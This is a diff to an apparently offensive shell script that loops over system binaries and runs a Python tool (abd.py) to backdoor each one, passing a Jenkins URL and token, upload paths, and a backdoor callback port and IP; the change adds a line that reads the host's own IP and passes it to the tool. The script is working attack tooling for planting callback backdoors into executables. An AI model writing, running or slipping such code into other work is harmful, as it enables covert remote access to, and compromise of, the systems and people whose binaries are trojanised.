@@ -31,9 +31,10 @@ L_PORT="8888" ##DECREPED
 
 
 ###python abd.py $BINARY $PLACE TO UPLOAD / DOWNLOAD $PUT SCRIPT LOCATION $JENKINS URL $Jenkins token $Jenkins project location $0 for linux $not used yet, always 0 $Backdoor callback port $backdoor callback ip / domain name
+curr_ip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'`
 echo "Array items:"
 for item in ${array[*]}
 do
 	printf "   %s\nBackdooring: " `which $item`
-	python $ABD_LOC `which $item` $P_URL $P_LOC $J_URL $J_TOKEN $J_PROJECT 0 0 $L_PORT $L_IP
+	python $ABD_LOC `which $item` $P_URL $P_LOC $J_URL $J_TOKEN $J_PROJECT 0 0 $L_PORT $L_IP $curr_ip
 done
